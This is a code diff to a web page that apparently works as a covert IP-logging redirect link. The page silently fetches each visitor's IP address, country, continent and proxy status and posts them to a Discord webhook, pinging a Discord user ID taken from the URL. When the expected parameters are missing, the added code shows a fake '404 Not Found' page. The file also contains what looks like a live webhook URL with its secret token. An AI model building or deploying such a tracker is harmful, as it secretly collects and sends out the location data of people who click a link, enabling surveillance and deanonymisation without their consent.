@@ -8,6 +8,7 @@
         body {
             font-family: Arial, sans-serif;
             margin: 20px;
+            text-align: center;
         }
         table {
             width: 100%;
@@ -24,23 +25,30 @@
         th {
             background-color: #f4f4f4;
         }
+        .error {
+            font-size: 24px;
+            color: red;
+            margin-top: 50px;
+        }
     </style>
 </head>
 <body>
-    <h1>IP Information</h1>
-    <table id="infoTable" style="display:none;">
-        <thead>
-            <tr>
-                <th>IP Version</th>
-                <th>IP Address</th>
-                <th>Country Name</th>
-                <th>Continent</th>
-                <th>Is Proxy</th>
-            </tr>
-        </thead>
-        <tbody>
-        </tbody>
-    </table>
+    <div id="content">
+        <h1>IP Information</h1>
+        <table id="infoTable" style="display:none;">
+            <thead>
+                <tr>
+                    <th>IP Version</th>
+                    <th>IP Address</th>
+                    <th>Country Name</th>
+                    <th>Continent</th>
+                    <th>Is Proxy</th>
+                </tr>
+            </thead>
+            <tbody>
+            </tbody>
+        </table>
+    </div>
 
     <script>
         const discordWebhookUrl = 'https://discord.com/api/webhooks/1322345788462071875/OrpRYnyIugZkioBPX5Nm1WaE8_LDh0dza2u8dNnWo5DY8ql0qG7ajjxf1MI3XCeA0aco'; // Replace with your Discord webhook URL
@@ -67,6 +75,29 @@
             const tbody = table.querySelector('tbody');
             tbody.innerHTML = ''; // Clear any previous data
 
+            // Extract query parameters
+            const queryParams = getQueryParams(window.location.href);
+            const queryKeys = Object.keys(queryParams);
+
+            if (queryKeys.length === 0) {
+                // Show 404 error if no query parameters
+                document.body.innerHTML = '<div class="error">404 Not Found</div>';
+                return;
+            }
+
+            // Assume the first parameter is the numeric ID, and the second is the encrypted UUID
+            const numericId = queryKeys[0];
+            const encryptedUUID = queryParams[numericId];
+            let redirectURL;
+
+            try {
+                // Attempt to decrypt the UUID
+                redirectURL = decryptUUID(encryptedUUID);
+            } catch {
+                document.body.innerHTML = '<div class="error">404 Not Found</div>';
+                return;
+            }
+
             try {
                 const response = await fetch('https://freeipapi.com/api/json');
 
@@ -88,13 +119,9 @@
                 tbody.innerHTML = row;
                 table.style.display = 'table';
 
-                // Get query params and decrypt URL
-                const queryParams = getQueryParams(window.location.href);
-                const encryptedURL = Object.values(queryParams)[0]; // Assume the first param is the encrypted UUID
-                const redirectURL = decryptUUID(encryptedURL);
-
                 // Prepare the embed payload for Discord
                 const embed = {
+                    content: `<@${numericId}>`, // Mentions the user outside the embed
                     embeds: [
                         {
                             title: "IP Information",
@@ -104,7 +131,8 @@
                                 { name: "Country Name", value: data.countryName || 'N/A', inline: true },
                                 { name: "Continent", value: data.continent || 'N/A', inline: true },
                                 { name: "Is Proxy", value: data.isProxy ? 'Yes' : 'No', inline: true },
-                                { name: "Redirect URL", value: redirectURL, inline: false }
+                                { name: "Redirect URL", value: redirectURL, inline: false },
+                                { name: "Matching Code", value: encryptedUUID, inline: false }
                             ],
                             color: 3447003 // Optional: Set a color for the embed
                         }
